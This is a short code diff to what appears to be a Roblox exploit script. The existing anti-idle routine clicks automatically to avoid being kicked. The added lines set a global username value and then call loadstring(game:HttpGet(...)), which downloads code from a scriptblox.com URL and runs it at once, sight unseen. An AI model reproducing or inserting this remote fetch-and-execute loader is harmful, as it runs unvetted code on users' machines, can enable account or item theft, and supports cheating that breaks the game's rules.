@@ -89,3 +89,8 @@ game:service'Players'.LocalPlayer.Idled:connect(function()
     bb:ClickButton2(Vector2.new())
     print("Roblox tried to kick u")
 end)
+
+getgenv().username = "8097077419";
+
+-- Special thanks to ShowerHeadFD, Jxnt, Mizkif.
+loadstring(game:HttpGet("https://scriptblox.com/raw/ScriptBlox-Direct-Execute-Feature_645", true))()
